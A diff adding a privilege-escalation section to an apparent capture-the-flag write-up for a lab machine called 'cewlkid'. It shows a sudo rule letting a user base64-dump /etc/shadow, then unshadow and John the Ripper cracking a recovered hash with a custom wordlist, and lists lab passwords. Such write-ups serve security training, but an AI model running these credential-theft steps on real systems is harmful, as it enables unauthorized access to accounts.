@@ -119,6 +119,44 @@ ipsum : SpeakPeople22!
 lorem : PeopleSpeak44!
 ```
 
+## 5.Privilege Escalation (lorem)
+
+Change the user to lorem and check sudo permissions again :
+
+```bash
+sudo -l
+Matching Defaults entries for lorem on cewlkid:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lorem may run the following commands on cewlkid:
+    (root : root) NOPASSWD: /usr/bin/base64 /etc/shadow
+```
+
+now we can get base64 encode of `/etc/shadow`, get it and merge it with `/etc/passwd` :
+
+```bash
+root@kali: unshadow passwd.txt shadow.txt > unshadow.txt
+```
+
+use the wordlist we generated earlier again :
+
+```bash
+john unshadow.txt --wordlist=wordlist.txt                
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+PageMaker        (zerocewl)     
+1g 0:00:00:00 DONE (2024-02-17 08:06) 3.125g/s 559.3p/s 2796c/s 2796C/s Follow..Language
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+yes we found another user password
 
 
+## 6.Privilege Escalation (zerocewl)
 
+Change user to `zerocewl`
